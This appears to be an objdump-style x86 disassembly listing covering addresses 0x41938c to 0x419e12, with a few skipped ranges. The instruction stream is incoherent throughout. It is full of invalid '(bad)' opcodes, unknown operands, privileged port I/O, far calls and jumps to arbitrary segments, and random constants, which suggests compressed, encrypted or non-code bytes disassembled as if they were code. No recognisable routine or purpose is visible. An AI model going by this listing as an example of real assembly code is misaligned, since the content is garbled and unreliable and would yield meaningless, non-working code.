  41938c:	xchg   edi,eax
  41938d:	ror    DWORD PTR ds:0x566524a5,1
  419393:	fcomp  DWORD PTR [ecx-0x44]
  419396:	xchg   ecx,eax
  419397:	xor    eax,0x8eb002b5
  41939c:	std    
  41939d:	mov    esp,0x79e43ed0
  4193a2:	push   esp
  4193a3:	inc    edi
  4193a4:	sbb    eax,0xca5c13c
  4193a9:	fiadd  DWORD PTR [ebx-0x26f3fcdc]
  4193af:	mov    DWORD PTR [edi+ebx*4-0x59],ecx
  4193b3:	jmp    0x419405
  4193b5:	mov    dl,bl
  4193b7:	xchg   BYTE PTR [ebp+0x28],ch
  4193ba:	ins    BYTE PTR es:[edi],dx
  4193bb:	mov    ebp,DWORD PTR [edi+0x1e53d517]
  4193c1:	jbe    0x419406
  4193c3:	stc    
  4193c4:	scas   eax,DWORD PTR es:[edi]
  4193c5:	popf   
  4193c6:	mov    ?,edx
  4193c8:	jbe    0x419381
  4193ca:	fisubr WORD PTR [ebp-0x3e]
  4193cd:	mov    cl,0x36
  4193cf:	cmp    al,0x9
  4193d1:	xchg   bx,cx
  4193d4:	lods   al,BYTE PTR ds:[esi]
  4193d5:	call   0xe181:0x3e0fa3c3
  4193dc:	mov    bh,0xac
  4193de:	and    ecx,DWORD PTR [esi+0x1e]
  4193e1:	jbe    0x4193f5
  4193e3:	inc    ecx
  4193e4:	in     eax,0x32
  4193e6:	int3   
  4193e7:	sub    al,BYTE PTR [esp+eax*2+0x57215b4e]
  4193ee:	pop    es
  4193ef:	cmp    BYTE PTR gs:[edx],ch
  4193f2:	push   ebp
  4193f3:	inc    ecx
  4193f4:	mov    ebx,0x2ec5119
  4193f9:	fsub   DWORD PTR [ecx]
  4193fb:	call   0xb88db132
  419400:	sbb    DWORD PTR [edx],edx
  419402:	(bad)  
  419403:	not    dh
  419405:	out    0x95,al
  419407:	ds xchg esp,eax
  419409:	adc    al,0x29
  41940b:	retf   
  41940c:	lods   al,BYTE PTR ds:[esi]
  41940d:	mov    al,0x1f
  41940f:	pop    edx
  419410:	std    
  419411:	idiv   DWORD PTR [ebp-0x6d]
  419414:	cdq    
  419415:	cmp    DWORD PTR [esi-0x44],ecx
  419418:	dec    edx
  419419:	push   ebp
  41941a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41941b:	pushf  
  41941c:	cld    
  41941d:	or     BYTE PTR [edi],cl
  41941f:	stos   BYTE PTR es:[edi],al
  419420:	jmp    0x4193b3
  419422:	mov    BYTE PTR [eax-0x446d2fb8],dl
  419428:	adc    cl,BYTE PTR [edx]
  41942a:	mov    BYTE PTR [edi+0x1a60b9f9],cl
  419430:	mov    ds:0x415ac947,eax
  419435:	jno    0x419466
  419437:	or     BYTE PTR [edi-0xff2c415],ch
  41943d:	push   esi
  41943e:	in     al,0x6f
  419440:	std    
  419441:	dec    edi
  419442:	lahf   
  419443:	inc    eax
  419444:	mov    ch,0xcb
  419446:	sub    ebx,edi
  419448:	add    BYTE PTR [esi],dh
  41944a:	jns    0x41942f
  41944c:	cld    
  41944d:	push   ds
  41944e:	(bad)  
  419450:	mov    edx,0xf7773829
  419455:	pusha  
  419456:	or     eax,0x2c10efcc
  41945b:	aaa    
  41945c:	mov    ebp,0xbcc5ce47
  419461:	pop    es
  419462:	(bad)  
  419464:	mov    WORD PTR [esi],ss
  419466:	lock dec ebx
  419468:	or     eax,0x3f93a7ff
  41946d:	arpl   WORD PTR [eax],ax
	...
  4194d3:	add    BYTE PTR [eax],al
  4194d5:	add    BYTE PTR ds:0xed3a6998,bh
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	out    0xb8,al
  4194e4:	jmp    0x4194f7
  4194e6:	adc    BYTE PTR [bx+di],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    BYTE PTR [ecx],dl
  4194ef:	dec    DWORD PTR [ebx+eiz*2-0x4372e40]
  4194f6:	pushf  
  4194f7:	jmp    0xf6986f5
  4194fc:	mov    dl,0x6e
  4194fe:	and    al,0xdd
  419500:	jp     0x4194c1
  419502:	push   0x95e35716
  419507:	sub    BYTE PTR [edi],cl
  419509:	int    0x17
  41950b:	pop    ds
  41950c:	sar    ah,1
  41950e:	mov    al,ds:0x8fe794db
  419513:	cmp    al,0x20
  419515:	adc    al,0x63
  419517:	mov    bh,0xd7
  419519:	fcom   QWORD PTR [ebx-0x5bb6510]
  41951f:	lds    eax,FWORD PTR [ecx]
  419521:	lahf   
  419522:	pusha  
  419523:	lahf   
  419524:	cmp    bh,BYTE PTR [edx-0x64]
  419527:	je     0x419547
  419529:	retf   0xc337
  41952c:	mov    WORD PTR [esi+0xe851150],cs
  419532:	or     ebp,DWORD PTR [edx-0x2be2c929]
  419538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419539:	test   BYTE PTR [edx],cl
  41953b:	push   esp
  41953c:	dec    ebp
  41953d:	pop    ss
  41953e:	pop    esi
  41953f:	div    ebx
  419541:	sbb    al,0x92
  419543:	mov    edx,0x53ff90a4
  419548:	test   eax,0x53078820
  41954d:	pop    ebp
  41954e:	pop    ss
  41954f:	je     0x4194ee
  419551:	ror    DWORD PTR [ecx],cl
  419553:	inc    esp
  419554:	pop    ds
  419555:	xchg   ebx,eax
  419556:	mov    ah,0x21
  419558:	push   cs
  419559:	push   edx
  41955a:	scas   eax,DWORD PTR es:[edi]
  41955b:	jns    0x4194f0
  41955d:	je     0x419518
  41955f:	or     bl,BYTE PTR [edi]
  419561:	ins    DWORD PTR es:[edi],dx
  419562:	int    0xd3
  419564:	mov    al,ds:0xac3c6e71
  419569:	call   0xf4e0cc6b
  41956e:	push   ds
  41956f:	pop    ebx
  419570:	retf   
  419571:	push   ecx
  419572:	push   ds
  419573:	inc    edi
  419574:	jmp    0x419507
  419576:	sbb    ch,BYTE PTR [edi+0x2c]
  419579:	fidiv  DWORD PTR [ecx]
  41957b:	je     0x419514
  41957d:	mov    ebp,0x18e87ffc
  419582:	sbb    edx,ebp
  419584:	iret   
  419585:	mov    si,0x5c
  419589:	add    BYTE PTR [eax+0x4e6e1452],cl
  41958f:	adc    DWORD PTR [ecx],edi
  419591:	repnz sub al,0xa2
  419594:	inc    ebx
  419595:	inc    edi
  419596:	jns    0x4195e3
  419598:	add    DWORD PTR [ebx+0x362ae0b],edi
  41959e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41959f:	jmp    0x419523
  4195a1:	jl     0x4195b6
  4195a3:	sahf   
  4195a4:	push   eax
  4195a5:	jl     0x41961b
  4195a7:	pop    ebp
  4195a8:	pop    ebp
  4195a9:	jecxz  0x41961b
  4195ab:	fsubrp st(6),st
  4195ad:	or     ecx,DWORD PTR [edx]
  4195af:	repz ss clc 
  4195b2:	rcr    BYTE PTR [esi-0x4f927b30],0x6d
  4195b9:	nop
  4195ba:	scas   al,BYTE PTR es:[edi]
  4195bb:	dec    edi
  4195bc:	and    eax,0xe43c0923
  4195c1:	fld    TBYTE PTR [ebp-0x4f]
  4195c4:	mov    ebx,0x7129020b
  4195c9:	xchg   edx,eax
  4195ca:	pop    esi
  4195cb:	sahf   
  4195cc:	mov    dl,0xa1
  4195ce:	bound  ebp,QWORD PTR [eax+0x6a]
  4195d1:	jne    0x4195e0
  4195d3:	dec    DWORD PTR ds:0x3a5b2fea
  4195d9:	inc    ecx
  4195da:	push   ebx
  4195db:	dec    eax
  4195dc:	fstp   TBYTE PTR [esi+ecx*2-0x52fa85cd]
  4195e3:	push   0x1a
  4195e5:	mov    eax,es
  4195e7:	imul   esp,ebp,0x81a0bd80
  4195ed:	cmp    eax,DWORD PTR [eax]
	...
  419653:	add    BYTE PTR [eax],al
  419655:	add    BYTE PTR [edi-0x9d722c],ch
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	sbb    bl,BYTE PTR [edx+0x7d]
  419665:	call   0x100:0x11167
  41966c:	add    BYTE PTR [eax],al
  41966e:	push   esi
  41966f:	call   0x55c5:0x5a95326
  419676:	pop    ecx
  419677:	into   
  419678:	jmp    0x2c13af1f
  41967d:	and    BYTE PTR [ebx-0x30ca9bec],cl
  419683:	inc    eax
  419684:	ficomp DWORD PTR [edx+0x3ca636b4]
  41968a:	mov    eax,ds:0xd847c43a
  41968f:	xchg   edx,eax
  419690:	lea    esp,[edx]
  419692:	aad    0x51
  419694:	mov    dl,0xe9
  419696:	inc    esp
  419697:	clc    
  419698:	in     al,dx
  419699:	popa   
  41969a:	and    bh,BYTE PTR [esi+edx*4-0x4f]
  41969e:	pop    es
  41969f:	(bad)  
  4196a0:	jmp    0xbd74:0x5052a10f
  4196a7:	xlat   BYTE PTR ds:[ebx]
  4196a8:	repnz test eax,0x252d175d
  4196ae:	sub    cl,BYTE PTR [ebx-0x9]
  4196b1:	push   ecx
  4196b2:	nop
  4196b3:	popf   
  4196b4:	in     al,0x84
  4196b6:	push   esp
  4196b7:	inc    di
  4196b9:	fcmovnbe st,st(5)
  4196bb:	push   cs
  4196bc:	mov    dh,0x42
  4196be:	fisub  DWORD PTR [edi+0x72c12efc]
  4196c4:	ins    BYTE PTR es:[edi],dx
  4196c5:	push   eax
  4196c6:	ds xor al,0x7d
  4196c9:	mov    ds:0x6b826ad8,eax
  4196ce:	xor    eax,0x36f8b6f7
  4196d3:	sub    eax,0x4192cd1e
  4196d8:	pop    ebx
  4196d9:	scas   eax,DWORD PTR es:[edi]
  4196da:	and    BYTE PTR [ebp-0x2e928216],cl
  4196e0:	fnsave [eax+0x406baba7]
  4196e6:	xor    al,0xc0
  4196e8:	sub    eax,0x6c23c325
  4196ed:	lds    edx,FWORD PTR [ecx-0x13]
  4196f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f1:	add    al,0xe4
  4196f3:	push   edi
  4196f4:	xor    al,BYTE PTR [esi]
  4196f6:	push   esi
  4196f7:	sub    BYTE PTR [edi+ebx*1-0x14],al
  4196fb:	(bad)
  4196ff:	jg     0x4196ec
  419701:	cmc    
  419702:	stos   BYTE PTR es:[edi],al
  419703:	leave  
  419704:	outs   dx,BYTE PTR ds:[esi]
  419705:	jge    0x4196bb
  419707:	or     ah,cl
  419709:	mov    ebp,0x75f64a8a
  41970e:	adc    DWORD PTR [edi+0x44e869bb],0x5e
  419715:	cmp    eax,0x78eaf4bc
  41971a:	jns    0x419787
  41971c:	inc    edx
  41971d:	outs   dx,DWORD PTR ds:[esi]
  41971e:	add    edi,DWORD PTR [edi]
  419720:	repz (bad) 
  419722:	(bad)  
  419724:	loop   0x41977a
  419726:	aad    0x3d
  419728:	and    ah,BYTE PTR [esi+0x4992b112]
  41972e:	cmc    
  41972f:	xchg   bh,bh
  419731:	push   ss
  419732:	mov    edx,0xcb09569f
  419737:	push   ds
  419738:	cwde   
  419739:	aaa    
  41973a:	dec    eax
  41973b:	mov    DWORD PTR [ecx],esp
  41973d:	nop
  41973e:	test   DWORD PTR ds:0xa576ddc1,ebx
  419744:	call   0x6f21:0xf018386f
  41974b:	int3   
  41974c:	fnstsw WORD PTR [ebx-0x1c]
  41974f:	add    BYTE PTR [eax+0x3],0x52
  419753:	push   ds
  419754:	jmp    0x48777cb3
  419759:	xor    edx,esi
  41975b:	add    ecx,edx
  41975d:	fnstenv [ebp+0x3ccc7944]
  419763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419764:	ds inc ebp
  419766:	push   es
  419767:	cmp    BYTE PTR [edx+0x2f],dl
  41976a:	fcmovnb st,st(2)
  41976c:	jb     0x4197a2
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xb58dd0ae
  4197e3:	in     al,dx
  4197e4:	mov    al,ds:0x11267a0
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    al,cl
  4197ef:	mov    esi,DWORD PTR [esi+edx*8+0x6a]
  4197f3:	add    DWORD PTR [edx],esp
  4197f5:	stc    
  4197f6:	pushf  
  4197f7:	inc    esp
  4197f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197f9:	mov    ecx,DWORD PTR [ecx]
  4197fb:	mov    esp,0x296c263c
  419800:	mov    eax,0x230e73fa
  419805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419806:	mov    ebp,0x119ff793
  41980b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41980c:	adc    ah,BYTE PTR [ebx-0x1]
  41980f:	mov    al,0x80
  419811:	mov    ch,0x95
  419813:	xchg   BYTE PTR [ecx-0x597d0a5b],dl
  419819:	ins    BYTE PTR es:[edi],dx
  41981a:	or     eax,0x2bdb9928
  41981f:	lods   al,BYTE PTR ds:[esi]
  419820:	adc    ah,dl
  419822:	ja     0x4197ad
  419824:	popa   
  419825:	mov    eax,ds:0x17732b08
  41982a:	loopne 0x419809
  41982c:	adc    eax,0x48de167d
  419831:	pusha  
  419832:	aaa    
  419833:	sbb    al,0xa3
  419835:	int3   
  419836:	push   ds
  419837:	ins    DWORD PTR es:[edi],dx
  419838:	fs (bad) 
  41983a:	enter  0x8c48,0xe5
  41983e:	add    ebx,ebp
  419840:	mov    fs,WORD PTR [edi+0xc]
  419843:	sbb    al,0xe
  419845:	and    ch,dh
  419847:	mov    cl,BYTE PTR [ebx+0x43]
  41984a:	icebp  
  41984b:	or     al,0x3
  41984d:	out    dx,al
  41984e:	inc    ebp
  41984f:	dec    esp
  419850:	xchg   ecx,eax
  419851:	cmp    eax,0xcade50b8
  419856:	fimul  WORD PTR [ebp+0x65a295ef]
  41985c:	in     al,dx
  41985d:	and    DWORD PTR [ebp+0x4667180b],esp
  419863:	clc    
  419864:	inc    eax
  419865:	cs sbb eax,0xa2f8cdd7
  41986b:	test   DWORD PTR [ecx+0x7c25b66e],esi
  419871:	fld    TBYTE PTR [edi*8-0x3c8c3297]
  419878:	push   ds
  419879:	mov    bh,0x52
  41987b:	xchg   ebp,eax
  41987c:	popa   
  41987d:	sahf   
  41987e:	fnstcw WORD PTR [eax-0x7daa0644]
  419884:	mov    esp,0x84022765
  419889:	loop   0x4198ff
  41988b:	pop    es
  41988c:	inc    edx
  41988d:	add    al,0xca
  41988f:	cvtdq2ps xmm2,XMMWORD PTR [ecx-0x89b29c2]
  419896:	imul   BYTE PTR [edi]
  419898:	pushf  
  419899:	mov    ebp,0x57ee2ce9
  41989e:	dec    ecx
  41989f:	into   
  4198a0:	dec    ebx
  4198a1:	cmc    
  4198a2:	icebp  
  4198a3:	repnz push edx
  4198a5:	push   ds
  4198a6:	sahf   
  4198a7:	jb     0x4198b4
  4198a9:	jg     0x41989c
  4198ab:	out    dx,eax
  4198ac:	cli    
  4198ad:	cli    
  4198ae:	shl    BYTE PTR [ebx+edx*2+0x4d],0x5
  4198b3:	lock out 0x37,al
  4198b6:	mov    cl,0x1e
  4198b8:	sub    BYTE PTR [ebx+0x6fb69a32],bl
  4198be:	clc    
  4198bf:	cmp    DWORD PTR [edi-0x1b],eax
  4198c2:	(bad)  
  4198c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198c4:	hlt    
  4198c5:	iret   
  4198c6:	dec    esi
  4198c7:	je     0x41984d
  4198c9:	pop    esp
  4198ca:	int3   
  4198cb:	jecxz  0x41987c
  4198cd:	pop    es
  4198ce:	das    
  4198cf:	into   
  4198d0:	dec    ebx
  4198d1:	cmp    ebp,ebp
  4198d3:	cmc    
  4198d4:	inc    esi
  4198d5:	add    eax,0xd5230a0b
  4198da:	nop
  4198db:	fiadd  DWORD PTR [ebx+edi*2+0x57]
  4198df:	sub    bl,dl
  4198e1:	adc    ecx,ebp
  4198e3:	repnz add eax,0xcde82547
  4198e9:	inc    ebp
  4198ea:	and    DWORD PTR ss:0xda,ecx
	...
  419955:	add    BYTE PTR [edx-0x201eb8e7],al
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnsave [eax-0x6f]
  419964:	mov    bh,BYTE PTR [edx+0x67]
  419967:	adc    eax,DWORD PTR [ecx]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    ah,ch
  41996f:	lods   ax,WORD PTR ds:[esi]
  419971:	add    cl,BYTE PTR [edx+0x1f]
  419974:	push   ebx
  419975:	bound  ecx,QWORD PTR [ebx+0x56]
  419978:	es sti 
  41997a:	sbb    DWORD PTR [edx-0x47],ebx
  41997d:	loopne 0x4199ed
  41997f:	sbb    esi,DWORD PTR [edi]
  419981:	sub    DWORD PTR [edi-0x2ba12499],eax
  419987:	inc    edi
  419988:	fbld   TBYTE PTR ds:0xece99266
  41998e:	das    
  41998f:	(bad)  
  419991:	mov    bh,0x3
  419993:	inc    ebx
  419994:	adc    al,0x60
  419996:	push   0xfbd96cff
  41999b:	shr    BYTE PTR [eax],1
  41999d:	and    al,0x54
  41999f:	jne    0x41996e
  4199a1:	adc    bh,BYTE PTR [ebx-0x6e]
  4199a4:	mov    ds:0x371c7d4c,eax
  4199a9:	jmp    0x4c5c:0x5eecde30
  4199b0:	fistp  QWORD PTR [ebx+0x6d00f8b4]
  4199b6:	adc    BYTE PTR [edi-0x3765bdb],al
  4199bc:	(bad)  
  4199be:	sbb    al,dh
  4199c0:	(bad)  
  4199c1:	xchg   BYTE PTR [eax-0x78cd5cfe],dl
  4199c7:	fsub   DWORD PTR [esi]
  4199c9:	adc    al,0xec
  4199cb:	inc    BYTE PTR [edx+0x3e]
  4199ce:	xor    BYTE PTR fs:[eax-0x48ef57f8],0x9c
  4199d6:	sti    
  4199d7:	or     ah,BYTE PTR [esi*2-0x50aa3754]
  4199de:	imul   ecx,DWORD PTR [eax-0x32],0xd3bd18bf
  4199e5:	ins    BYTE PTR es:[edi],dx
  4199e6:	add    bh,0x71
  4199e9:	fcmovne st,st(7)
  4199eb:	xor    dh,0xb8
  4199ee:	mov    ah,0xf5
  4199f0:	std    
  4199f1:	push   edi
  4199f2:	mov    ecx,0xf4627bf4
  4199f7:	iret   
  4199f8:	(bad)  [ebx-0x281b704c]
  4199fe:	loope  0x419a5c
  419a00:	fldcw  WORD PTR [eax-0x48]
  419a03:	cmp    al,0xad
  419a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a06:	icebp  
  419a07:	mov    eax,ds:0x9ed2002
  419a0c:	into   
  419a0d:	test   eax,0x174ff6bb
  419a12:	pop    esp
  419a13:	xchg   ecx,eax
  419a14:	mov    ch,0xcc
  419a16:	bound  esp,QWORD PTR [ecx-0x5f6b3c81]
  419a1c:	test   eax,0xd02b3cdb
  419a21:	fimul  WORD PTR [eax+edi*8-0x6aabd2d3]
  419a28:	mov    al,0x20
  419a2a:	sbb    BYTE PTR [eax+0x2e92be90],dh
  419a30:	fidivr DWORD PTR [esi-0x5e]
  419a33:	psubb  mm4,QWORD PTR [edx+0x4766c2d]
  419a3a:	add    al,0xa5
  419a3c:	jns    0x419a3a
  419a3e:	int3   
  419a3f:	call   0x4afc46f5
  419a44:	jp     0x4199f0
  419a46:	xchg   ebp,eax
  419a47:	jae    0x4199ed
  419a49:	or     ah,cl
  419a4b:	mov    ah,0xcd
  419a4d:	push   0x52493ff0
  419a52:	inc    esp
  419a53:	mov    edi,0x152174df
  419a58:	pop    esp
  419a59:	outs   dx,DWORD PTR ds:[esi]
  419a5a:	(bad)  
  419a5c:	(bad)  ss:[edx-0x16]
  419a60:	std    
  419a61:	jle    0x419a83
  419a63:	xlat   BYTE PTR ds:[ebx]
  419a64:	mov    esp,0xc6bbb01a
  419a69:	push   cs
  419a6a:	lds    ebx,FWORD PTR [ecx+0xb07]
	...
  419ad4:	add    BYTE PTR [eax],al
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0x3bbd92c2,cl
  419ae5:	cdq    
  419ae6:	addr16 adc al,0x1
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    bl,bl
  419aef:	sti    
  419af0:	stos   DWORD PTR es:[edi],eax
  419af1:	or     al,0xe2
  419af3:	retf   
  419af4:	fiadd  WORD PTR [edi+0x3e]
  419af7:	int    0x48
  419af9:	enter  0x629f,0x5e
  419afd:	push   ecx
  419afe:	dec    esi
  419aff:	sub    ah,BYTE PTR [edx-0x1857263b]
  419b05:	hlt    
  419b06:	bound  edx,QWORD PTR [eax+0xa]
  419b09:	adc    ecx,DWORD PTR [edi]
  419b0b:	mov    ebx,0x4368aa57
  419b10:	(bad)  
  419b11:	jl     0x419b7c
  419b13:	push   esi
  419b14:	retf   
  419b15:	popf   
  419b16:	xor    edi,ebp
  419b18:	pop    edi
  419b19:	ds dec edx
  419b1b:	dec    ebp
  419b1c:	idiv   DWORD PTR [eax-0x238d22e1]
  419b22:	out    dx,eax
  419b23:	cli    
  419b24:	iret   
  419b25:	sub    DWORD PTR [eax-0x35],esp
  419b28:	test   al,0xe8
  419b2a:	(bad)  
  419b2b:	jge    0x419ba2
  419b2d:	pusha  
  419b2e:	gs (bad) 
  419b30:	pop    ds
  419b31:	cmp    ch,ah
  419b33:	sub    eax,0x9c7e3f18
  419b38:	add    cl,BYTE PTR [esi]
  419b3a:	ins    BYTE PTR es:[edi],dx
  419b3b:	ret    0xe4a2
  419b3e:	int    0x1c
  419b40:	pushf  
  419b41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b42:	pop    ebp
  419b43:	lock ror DWORD PTR [esi+edx*2+0x5bc644ee],cl
  419b4b:	cmp    dh,bh
  419b4d:	push   esp
  419b4e:	stc    
  419b4f:	jmp    0xf0f9:0xd24e38c0
  419b56:	mov    al,ds:0xc5c2c1ac
  419b5b:	sub    esp,DWORD PTR [ebx-0x43a8820]
  419b61:	and    BYTE PTR [esi+0x3a],cl
  419b64:	jb     0x419bba
  419b66:	mov    esp,0xe885c226
  419b6b:	aas    
  419b6c:	mov    ch,0x1f
  419b6e:	pushf  
  419b6f:	or     bl,dl
  419b71:	adc    ch,cl
  419b73:	pop    eax
  419b74:	call   0xf9a4:0xaa2d5ef4
  419b7b:	xlat   BYTE PTR ds:[ebx]
  419b7c:	add    al,0x34
  419b7e:	mul    DWORD PTR [edx+0x3155fb14]
  419b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b85:	xor    bh,BYTE PTR [esi+0x7102a406]
  419b8b:	mov    ?,WORD PTR [eax+0x7a8cf574]
  419b91:	mov    ds:0xd155b14,al
  419b96:	nop
  419b97:	clc    
  419b98:	sub    BYTE PTR [ecx+ecx*4],dh
  419b9b:	dec    ecx
  419b9c:	mov    WORD PTR [edx-0x6656b0e5],fs
  419ba2:	pop    ecx
  419ba3:	pop    ebx
  419ba4:	shl    DWORD PTR [ecx],0xe8
  419ba7:	dec    eax
  419ba8:	xor    eax,0xe434d822
  419bad:	cmp    al,0x52
  419baf:	jl     0x419b3a
  419bb1:	call   0xe88:0xbe189966
  419bb8:	sub    BYTE PTR [esi],dh
  419bba:	sub    dh,BYTE PTR [eax+ecx*1]
  419bbd:	std    
  419bbe:	or     dl,BYTE PTR [ecx-0x7b7e46d1]
  419bc4:	test   edx,esi
  419bc6:	jecxz  0x419c18
  419bc8:	fistp  WORD PTR [ebx-0x192159db]
  419bce:	imul   ebp,DWORD PTR [edi],0x5df4d0e1
  419bd4:	push   ebp
  419bd5:	or     BYTE PTR [edx+0x66],ah
  419bd8:	pop    ss
  419bd9:	and    edx,ecx
  419bdb:	sub    BYTE PTR [ecx],bl
  419bdd:	mov    ebx,0x5ddd82d2
  419be2:	push   ebx
  419be3:	sbb    DWORD PTR [edi],ebp
  419be5:	push   0xfffffff0
  419be7:	jae    0x419c4a
  419be9:	pop    eax
  419bea:	int    0x6e
  419bec:	daa    
  419bed:	adc    al,BYTE PTR [eax]
	...
  419c53:	add    BYTE PTR [eax],al
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0xeb
  419c63:	je     0x419c61
  419c65:	dec    edi
  419c66:	addr16 adc eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	xor    ebx,0xffffff95
  419c71:	cmp    BYTE PTR [esi+0x38398340],dl
  419c77:	or     ah,cl
  419c79:	je     0x419cc0
  419c7b:	mov    fs,WORD PTR [edi]
  419c7d:	rol    BYTE PTR [edi-0xe],cl
  419c80:	xchg   edx,eax
  419c81:	mov    DWORD PTR [edx+0x10262307],ebx
  419c87:	les    ecx,FWORD PTR [eax]
  419c89:	fist   WORD PTR [eax-0x60f6374]
  419c8f:	cld    
  419c90:	(bad)  
  419c92:	inc    ebp
  419c93:	push   cs
  419c94:	adc    eax,0xb4bbf61b
  419c99:	retf   0x8861
  419c9c:	push   ebp
  419c9d:	dec    ecx
  419c9e:	pop    ecx
  419c9f:	xlat   BYTE PTR ds:[ebx]
  419ca0:	xor    al,BYTE PTR [ebp+0x26995d6b]
  419ca6:	jnp    0x419c5b
  419ca8:	push   cs
  419ca9:	daa    
  419caa:	push   cs
  419cab:	and    dh,BYTE PTR [eax+0x6f]
  419cae:	std    
  419caf:	sub    BYTE PTR [esp+edx*8+0x55],bl
  419cb3:	pop    ss
  419cb4:	scas   eax,DWORD PTR es:[edi]
  419cb5:	cmp    eax,0x7f7e076d
  419cba:	ror    ecx,0xdf
  419cbd:	lahf   
  419cbe:	pop    esi
  419cbf:	or     BYTE PTR ds:0xda8166f6,0xd0
  419cc6:	mov    ?,WORD PTR [esi+0x44]
  419cc9:	and    BYTE PTR [ecx],cl
  419ccb:	outs   dx,DWORD PTR ds:[esi]
  419ccc:	fnstenv [esi+eiz*2-0x706e8cdb]
  419cd3:	jmp    0x26db:0x6684e7a5
  419cda:	push   ss
  419cdb:	jmp    0x419d15
  419cdd:	mov    ebx,0x43a2df5f
  419ce2:	mov    cl,0xd7
  419ce4:	jns    0x419d06
  419ce6:	in     al,0x20
  419ce8:	pushf  
  419ce9:	jge    0x419d1a
  419ceb:	addr16 mov dl,0x3f
  419cee:	add    al,0x6d
  419cf0:	js     0x419d10
  419cf2:	inc    ebp
  419cf3:	cmp    dl,bh
  419cf5:	adc    al,0x7d
  419cf7:	test   al,0x35
  419cf9:	mov    ebx,0x4757b044
  419cfe:	lods   al,BYTE PTR ds:[esi]
  419cff:	ins    BYTE PTR es:[edi],dx
  419d00:	sub    BYTE PTR [ecx+0x5058cd60],ah
  419d06:	mov    al,ds:0x3730cd1c
  419d0b:	mov    al,0x99
  419d0d:	xchg   DWORD PTR [edx+0x5a],ebp
  419d10:	pusha  
  419d11:	mov    bl,0xa2
  419d13:	nop
  419d14:	fild   DWORD PTR [eax+0x8]
  419d17:	xchg   edi,eax
  419d18:	inc    eax
  419d19:	lea    ecx,ds:0x2fa53781
  419d1f:	cld    
  419d20:	sub    DWORD PTR [eax-0x41],esi
  419d23:	(bad)  
  419d24:	or     eax,0x28e90148
  419d29:	retf   
  419d2a:	idiv   DWORD PTR [esi+edi*2-0x47ce27b2]
  419d31:	scas   eax,DWORD PTR es:[edi]
  419d32:	repnz shr BYTE PTR [esi],0x3b
  419d36:	arpl   WORD PTR [esi],bx
  419d38:	xor    edx,edi
  419d3a:	adc    bh,BYTE PTR [ebx+0xf]
  419d3d:	(bad)  
  419d3e:	int3   
  419d3f:	mov    WORD PTR [ecx+0x23],?
  419d42:	mov    bh,0x6f
  419d44:	into   
  419d45:	xchg   esi,eax
  419d46:	mov    bl,0x22
  419d48:	mov    DWORD PTR [edi*2-0xdb1f5f8],esi
  419d4f:	mov    BYTE PTR [esi],bh
  419d51:	rcr    BYTE PTR [esi+edi*4],1
  419d54:	dec    esp
  419d55:	(bad)  
  419d56:	je     0x419dab
  419d58:	cmp    cl,BYTE PTR [edi-0x6d28049d]
  419d5e:	fdiv   DWORD PTR [eax+0x35]
  419d61:	push   ebx
  419d62:	aaa    
  419d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d64:	out    dx,eax
  419d65:	jp     0x419d21
  419d67:	cli    
  419d68:	inc    edx
  419d69:	sub    BYTE PTR [eax],bl
  419d6b:	loopne 0x419d2d
  419d6d:	popf   
	...
  419dd6:	lock xchg edi,eax
  419dd8:	std    
  419dd9:	cmp    al,0xff
  419ddb:	jle    0x419dce
  419ddd:	fistp  QWORD PTR [edi-0x16]
  419de0:	ss fcmovu st,st(2)
  419de3:	lea    esp,[eax]
  419de5:	mov    al,0x67
  419de7:	push   ss
  419de8:	add    DWORD PTR [eax],eax
  419dea:	add    BYTE PTR [ecx],al
  419dec:	add    BYTE PTR [eax],al
  419dee:	inc    ebp
  419def:	mov    eax,ds:0x989f4f20
  419df4:	pop    es
  419df5:	xchg   ebp,eax
  419df6:	daa    
  419df7:	add    BYTE PTR [esi-0x3],ch
  419dfa:	pop    esp
  419dfb:	loopne 0x419def
  419dfd:	jl     0x419dee
  419dff:	or     DWORD PTR [ecx-0x3202abd3],0x1a
  419e06:	xchg   ebx,eax
  419e07:	(bad)  
  419e08:	iret   
  419e09:	push   0x9de0642
  419e0e:	or     edx,DWORD PTR [ebp-0xf]
  419e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e12:	mov    edx,0xf38de554
